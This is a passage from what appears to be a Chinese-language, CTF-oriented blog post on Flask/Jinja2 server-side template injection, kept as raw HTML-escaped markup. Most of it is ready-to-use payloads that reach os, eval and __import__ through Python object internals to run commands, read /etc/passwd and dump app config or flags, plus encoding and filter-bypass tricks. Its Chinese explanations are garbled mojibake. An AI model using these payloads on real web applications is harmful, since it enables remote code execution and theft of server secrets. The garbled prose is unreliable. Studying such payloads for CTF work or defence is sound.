style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;whoami&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">{{()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()[&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__globals__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;os&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__dict__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">environ&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;FLAG]}}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä¸å«Œéº»çƒ¦çš„è¿˜å¯ä»¥å†å¥—ä¸€å±‚ï¼Œç”¨&lt;code>linecache&lt;/code>æ¥è°ƒç”¨&lt;code>os&lt;/code>ï¼Œpy2ä¸­æœ‰è¿™ä¸¤ä¸ªç±»å«æœ‰&lt;code>linecache&lt;/code>æ¨¡å—&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># &amp;lt;class &amp;#39;warnings.WarningMessage&amp;#39;&amp;gt;, 58&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># &amp;lt;class &amp;#39;warnings.catch_warnings&amp;#39;, 59&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">[]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()[&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__globals__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;linecache&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__dict__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;os&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__dict__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;system&amp;#39;&lt;/span>&lt;span style="color:#111">](&lt;/span>&lt;span style="color:#d88200">&amp;#39;whoami&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="py3---__builtins__">py3 - __builtins__&lt;/h4>
&lt;p>py3ä¸­å°±æ²¡è¿™ä¹ˆç›´æ¥ï¼Œè¦å…³æ³¨çš„æ¨¡å—æ˜¯&lt;code>__builtins__&lt;/code>ï¼Œå€ŸåŠ©å®ƒæ¥è°ƒç”¨å†…ç½®çš„&lt;code>open()&lt;/code>è¿›è¡Œæ–‡ä»¶è¯»å†™ï¼Œç”¨&lt;code>eval()&lt;/code>å°†&lt;code>os&lt;/code>æ¨¡å—å¼•å…¥rce&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()[&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__globals__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;__builtins__&amp;#39;&lt;/span>&lt;span style="color:#111">][&lt;/span>&lt;span style="color:#d88200">&amp;#39;eval&amp;#39;&lt;/span>&lt;span style="color:#111">](&lt;/span>&lt;span style="color:#d88200">&amp;#34;__import__(&amp;#39;os&amp;#39;).system(&amp;#39;whoami&amp;#39;)&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()[&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__globals__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;__builtins__&amp;#39;&lt;/span>&lt;span style="color:#111">][&lt;/span>&lt;span style="color:#d88200">&amp;#39;open&amp;#39;&lt;/span>&lt;span style="color:#111">](&lt;/span>&lt;span style="color:#d88200">&amp;#39;/etc/passwd&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;r&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>æˆ–è€…æ˜¯ç›´æ¥ç”¨&lt;code>__import__&lt;/code>åŠ è½½&lt;code>os&lt;/code>æ¨¡å—æ‰§è¡Œå‘½ä»¤&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()[&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__globals__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;__builtins__&amp;#39;&lt;/span>&lt;span style="color:#111">][&lt;/span>&lt;span style="color:#d88200">&amp;#39;__import__&amp;#39;&lt;/span>&lt;span style="color:#111">](&lt;/span>&lt;span style="color:#d88200">&amp;#39;os&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">popen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;whoami&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>py2æœ‰ä¸ªç‰¹æ®Šçš„&lt;code>commands&lt;/code>æ¨¡å—ä¹Ÿå¯ä»¥ç›´æ¥rce&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()[&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__globals__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;__builtins__&amp;#39;&lt;/span>&lt;span style="color:#111">][&lt;/span>&lt;span style="color:#d88200">&amp;#39;__import__&amp;#39;&lt;/span>&lt;span style="color:#111">](&lt;/span>&lt;span style="color:#d88200">&amp;#39;commands&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">getstatusoutput&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;whoami&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>â€”â€”â€”â€”â€”â€”æ³¨æ„å¼•ç”¨&lt;code>__builtins__&lt;/code>å†…å»ºæ¨¡å—è¿™ä¸€æ–¹å¼åœ¨py2&amp;amp;py3å®Œå…¨é€šæ€&lt;/p>
&lt;h2 id="å¸¸ç”¨payload">å¸¸ç”¨payload&lt;/h2>
&lt;p>å…¶å®ä¸Šé¢å·²ç»åˆ—ä¸¾çš„æ¯”è¾ƒå…¨å•¦ï¼Œè¿™é‡Œåšä¸€äº›å°å°çš„è¡¥å……&lt;/p>
&lt;h3 id="forè¯­å¥ç¡®å®šç´¢å¼•ä½ç½®">forè¯­å¥ç¡®å®šç´¢å¼•ä½ç½®&lt;/h3>
&lt;p>å‰é¢æåˆ°è¿‡ä¸€ç‚¹ï¼Œæˆ‘ä»¬éœ€è¦çš„å­ç±»åœ¨pythonä¸åŒç‰ˆæœ¬ä¸­ä½ç½®å¹¶ä¸å›ºå®šï¼ˆä¸»è¦æ˜¯py3 py2çš„åŸºæœ¬å›ºå®šæ­»äº†ï¼‰ï¼Œé’ˆå¯¹è¿™ä¸ªé—®é¢˜å¯ä»¥ç”¨Jinjaæ”¯æŒçš„forè¯­å¥æ¥è§£å†³ï¼Œsubmoduleçš„åå­—å¯ä»¥ç”¨ä¸Šé¢çš„è„šæœ¬è·‘&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>{% for c in ().__class__.__base__.__subclasses__() %}{% if c.__name__==&amp;#39;submodule&amp;#39; %}{{ c.__init__.__globals__[&amp;#39;__builtins__&amp;#39;].open(&amp;#39;filename&amp;#39;, &amp;#39;r&amp;#39;).read() }}{% endif %}{% endfor %}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>{% for c in ().__class__.__base__.__subclasses__() %}{% if c.__name__==&amp;#39;submodule&amp;#39; %}{{c.__init__.__globals__[&amp;#39;__builtins__&amp;#39;].eval(&amp;#34;__import__(&amp;#39;os&amp;#39;).popen(&amp;#39;id&amp;#39;).read()&amp;#34;) }}{% endif %}{% endfor %}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="ç‰¹æ®Šçš„ä¸€äº›å¯¹è±¡">ç‰¹æ®Šçš„ä¸€äº›å¯¹è±¡&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>{{config}}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{{config.items()}}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{{config.__class__.__init__.__globals__[&amp;#39;os&amp;#39;].popen(&amp;#39;ls&amp;#39;).read()}}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>{{get_flashed_messages.__globals__[&amp;#39;current_app&amp;#39;].config}}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>{{app.__init__.__globals__.sys.modules.app.app.__dict__}}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>{{url_for.__globals__[&amp;#39;__builtins__&amp;#39;].__import__(&amp;#39;os&amp;#39;).system(&amp;#39;ls&amp;#39;)}}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{{url_for.__globals__[&amp;#39;current_app&amp;#39;].config.FLAG}}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>{{request.__init__.__globals__[&amp;#39;__builtins__&amp;#39;].open(&amp;#39;/etc/passwd&amp;#39;).read()}}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{{request.application.__self__._get_data_for_json.__globals__[&amp;#39;json&amp;#39;].JSONEncoder.default.__globals__[&amp;#39;current_app&amp;#39;].config[&amp;#39;FLAG&amp;#39;]}}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="å„ç§å„æ ·çš„bypass">å„ç§å„æ ·çš„bypass&lt;/h2>
&lt;p>ä¸€èˆ¬éƒ½ä¸ä¼šåªè¿‡æ»¤ä¸€ç§çš„ï¼Œç»¼åˆåº”ç”¨&lt;/p>
&lt;h3 id="é’ˆå¯¹å…³é”®å­—çš„è¿‡æ»¤">é’ˆå¯¹å…³é”®å­—çš„è¿‡æ»¤&lt;/h3>
&lt;p>ä»¥classä¸ºä¾‹ï¼Œåšä¸€ä¸ªå­—ç¬¦ä¸²çš„æ‹¼æ¥&lt;/p>
&lt;ul>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">&amp;#39;cl&amp;#39;&lt;/span>&lt;span style="color:#f92672">~&lt;/span>&lt;span style="color:#d88200">&amp;#39;ass&amp;#39;&lt;/span> &lt;span style="color:#75715e"># æ‹¼æ¥&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">&amp;#34;cl&amp;#34;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#d88200">&amp;#34;ass&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">&amp;#39;cla&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;ss&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e"># æ‹¼æ¥&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">&amp;#39;Y2xhc3M=&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;base64&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e"># b64&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\u0063\u006C\u0061\u0073\u0073&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span> &lt;span style="color:#75715e"># unicode&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\x63\x6c\x61\x73\x73&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span> &lt;span style="color:#75715e"># hex&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;h3 id="è¿‡æ»¤">è¿‡æ»¤&lt;code>[]&lt;/code>&lt;/h3>
&lt;p>&lt;code>[]&lt;/code>ç”¨åœ¨å­—å…¸æŒ‰ç´¢å¼•å–å€¼å’Œæ•°ç»„ä¸­å–å€¼ï¼Œä¸è¿‡ç¦æ­¢äº†è¿˜æ˜¯æœ‰å‡½æ•°å¯ä»¥ç”¨&lt;/p>
&lt;ul>
&lt;li>
&lt;p>&lt;code>__getitem__&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__getitem__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__globals__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__getitem__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;__builtins__&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__getitem__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;eval&amp;#39;&lt;/span>&lt;span style="color:#111">)(&lt;/span>&lt;span style="color:#d88200">&amp;#39;__import__(&amp;#34;os&amp;#34;).popen(&amp;#34;ls /&amp;#34;).read()&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;code>pop()&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">pop&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__globals__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">pop&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;__builtins__&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">pop&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;eval&amp;#39;&lt;/span>&lt;span style="color:#111">)(&lt;/span>&lt;span style="color:#d88200">&amp;#39;__import__(&amp;#34;os&amp;#34;).popen(&amp;#34;ls /&amp;#34;).read()&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;code>.&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__bases__&lt;/span>&lt;span style="color:#ae81ff">.0&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__globals__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">linecache&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">popen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;whoami&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;h3 id="è¿‡æ»¤-1">è¿‡æ»¤&lt;code>.&lt;/code>&lt;/h3>
&lt;p>&lt;code>.&lt;/code>ç‚¹å·ç”¨åœ¨å‘ä¸‹ä¸åœåœ°å–å€¼ï¼Œè·Ÿ&lt;code>[]&lt;/code>å¾ˆåƒ&lt;/p>
&lt;ul>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;__class__&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;code>attr()&lt;/code> å¾ˆå¼ºçš„ä¸€ä¸ªflaskå†…ç½®filterï¼Œ&lt;code>foo|attr(&amp;quot;bar&amp;quot;) == foo.bar&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">{{()&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#111">attr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;__class__&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#111">attr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;__base__&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">............&lt;/span>&lt;span style="color:#111">}}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;h3 id="è¿‡æ»¤-2">è¿‡æ»¤&lt;code>'&lt;/code>&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>&lt;code>chr&lt;/code> å…ˆæ‰¾å‡º&lt;code>chr()&lt;/code>çš„ä½ç½®ï¼ˆæ³¨æ„è·‘è„šæœ¬è·‘çš„æ˜¯&lt;code>__builtins__&lt;/code> è¿™ä¸ªå‡½æ•°æ˜¯å†…å»ºçš„ï¼‰ï¼Œç”¨æ¨¡æ¿è¯­å¥ç»™å®ƒèµ‹ä¸ªå€¼ï¼Œç„¶åè°ƒç”¨&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>{% set chr=().__class__.__bases__[0].__subclasses__()[index].__init__.__globals__.__builtins__.chr%}{{().__class__.__bases__.[0].__subclasses__().pop(40)(chr(47)+chr(101)+chr(116)+chr(99)+chr(47)+chr(112)+chr(97)+chr(115)+chr(115)+chr(119)+chr(100)).read()}}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;code>request.args&lt;/code> flaskä¸­å­˜å‚¨è¯·æ±‚å‚æ•°åŠå€¼çš„å­—å…¸ï¼Œå¯ä»¥å°†å€¼å…ˆèµ‹ç»™å®ƒç„¶åè¿›è¡Œè°ƒç”¨&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>{{[].__class__.__base__.__subclasses__()[index].__init__.__globals__[request.args.arg1]}}&lt;span style="color:#960050;background-color:#1e0010">&amp;amp;&lt;/span>arg1=os
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
